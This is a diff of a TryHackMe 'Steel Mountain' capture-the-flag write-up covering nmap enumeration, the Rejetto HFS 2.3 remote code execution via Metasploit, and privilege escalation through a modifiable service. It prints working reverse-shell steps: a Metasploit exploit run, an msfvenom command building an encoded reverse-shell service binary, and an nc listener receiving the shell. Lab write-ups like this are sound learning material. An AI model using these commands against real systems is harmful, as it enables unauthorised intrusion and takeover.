@@ -6,22 +6,23 @@ categories:
   - TryHackMe
 ---
 
-![steel-mountain](/thm/Steel%20Mountain/steel-mountain.jpeg)
+{{< post-img src="steel-mountain.jpeg" alt="steel-mountain" style="width: 200px;" >}}
 
 This one is a cool room!
 
-I have been very busy this year and could not play much but decided to give a shot to premium THM nonetheless. I was not disappointed!
+I have been very busy this year and could not play much but decided to give a shot to
+premium THM nonetheless.
+I was not disappointed!
 
 ## Enumeration
 
-### nmap
 
-```
+```bash
 PORT      STATE SERVICE            REASON  VERSION
 80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
 |_http-title: Site doesn't have a title (text/html).
 |_http-server-header: Microsoft-IIS/8.5
-| http-methods: 
+| http-methods:
 |   Supported Methods: OPTIONS TRACE GET HEAD POST
 |_  Potentially risky methods: TRACE
 
@@ -32,7 +33,7 @@ PORT      STATE SERVICE            REASON  VERSION
 445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
 
 3389/tcp  open  ssl/ms-wbt-server? syn-ack
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: STEELMOUNTAIN
 |   NetBIOS_Domain_Name: STEELMOUNTAIN
 |   NetBIOS_Computer_Name: STEELMOUNTAIN
@@ -72,7 +73,7 @@ PORT      STATE SERVICE            REASON  VERSION
 8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
 |_http-title: HFS /
 |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST
 |_http-server-header: HFS 2.3
 49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
@@ -83,7 +84,7 @@ PORT      STATE SERVICE            REASON  VERSION
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-time: 
+| smb2-time:
 |   date: 2023-05-07T19:28:23
 |_  start_date: 2023-05-07T19:25:00
 | nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02a75f0c73cf (unknown)
@@ -96,42 +97,41 @@ Host script results:
 |   0000000000000000000000000000000000
 |_  0000000000000000000000000000
 |_clock-skew: mean: 1s, deviation: 0s, median: 1s
-| smb2-security-mode: 
-|   302: 
+| smb2-security-mode:
+|   302:
 |_    Message signing enabled but not required
-| p2p-conficker: 
+| p2p-conficker:
 |   Checking for Conficker.C or higher...
 |   Check 1 (port 6276/tcp): CLEAN (Couldn't connect)
 |   Check 2 (port 38069/tcp): CLEAN (Couldn't connect)
 |   Check 3 (port 27325/udp): CLEAN (Failed to receive data)
 |   Check 4 (port 48829/udp): CLEAN (Timeout)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
-
 ```
 
 Obviously there would be a website on another port! who didn't see it coming?
-
 First the decoy website got us the first answer...
 
-```
+```html
 <a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
 <h3>Employee of the month</h3>
 <img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
 ```
-Lol how this guy got employee of the month?
 
+Lol how this guy got employee of the month?
 Then the real stuff...
 
 `rejetto http file server 2.3` looking so vulnerable right now...
 
-Google for the CVE details. Big hint: It's a RCE!
+Google for the CVE details. Big hint: It's an RCE!
 
-(If you are playing on THM too be careful submitting the answer, remove CVE and just submit the number)
+(If you are playing on THM too be careful submitting the answer,
+remove CVE and just submit the number)
 
 Steel mountain looks more like rubble mountain now
 
@@ -139,12 +139,12 @@ Steel mountain looks more like rubble mountain now
 
 ok mostly two methods are available here. The `metasploit way` and the `I-download-scripts-manually way` but after doing both I think they are very similar so I won't separate and just go with metasploit (this is a guided room anyway)
 
-setup options acordingly (Do not forget to change the remote TARGET PORT!)
+setup options accordingly (Do not forget to change the remote TARGET PORT!)
 
-```
+```bash
 msf6 exploit(windows/http/rejetto_hfs_exec) > run
 
-[*] Started reverse TCP handler on 10.8.4.19:4444 
+[*] Started reverse TCP handler on 10.8.4.19:4444
 [*] Using URL: http://10.8.4.19:8080/jaISnbG8B
 [*] Server started.
 [*] Sending a malicious request to /
@@ -166,15 +166,14 @@ Mode              Size  Type  Last modified              Name
 
 meterpreter > cat user.txt
 ��t0t4lly-r34l-st33l-fl4g-n07-f4k3
-
 ```
-If you see unicode characters in the flag do not worry and just submit it
+If you see weird unicode characters in the flag do not worry and just submit it
 
 ## Privilege escalation
 
 Download the `Powersploit` powershell script and upload it using the meterpreter
 
-```
+```bash
 meterpreter > upload PowerUp.ps1
 [*] Uploading  : /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
 [*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
@@ -248,14 +247,13 @@ CanRestart                      : False
 Name                            : LiveUpdateSvc
 Check                           : Modifiable Service Files
 
-
 ```
 
 Lol who even use Iobit products anymore??
 
-```
+```bash
 └─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.8.4.19 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
-[sudo] Mot de passe de nairolf32 : 
+[sudo] Mot de passe de nairolf32 :
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
@@ -267,12 +265,9 @@ Final size of exe-service file: 15872 bytes
 Saved as: ASCService.exe
 ```
 
-Note how I named the file `ASCService.exe` (and not Advanced.exe in the misleading exemple from the hint)
-
+Note how I named the file `ASCService.exe` (and not Advanced.exe in the misleading example from the hint)
 because that is actually the name of the service binary we need to overwrite for our `unquoted service` attack
-
 you can use whatever command to replace/move it to the right path (`copy` command ftw)
-
 Oh yeah you better stop the service before replacing
 
 `sc stop AdvancedSystemCareService9`
@@ -283,7 +278,7 @@ And when you are done just prepare another listenner and restart your malicious 
 
 And then you pwn this machine like a b055!
 
-```
+```bash
 └─$ nc -lnvp 2311
 listening on [any] 2311 ...
 connect to [10.8.4.19] from (UNKNOWN) [10.10.142.54] 49381
@@ -314,7 +309,7 @@ fl4g_0f_st33l_mR_R0b07_fl4G
 
 ```
 hehe! nice room! the most interesting part is probably the privilege escalation!
+don't forget to leave a readme file with "Leave me here!" as content
+(It's very important!)
 
-don't forget to leave a readme file with "Leave me here!" as content (It's important!)
-
-aye, take care!
+take care, friend!
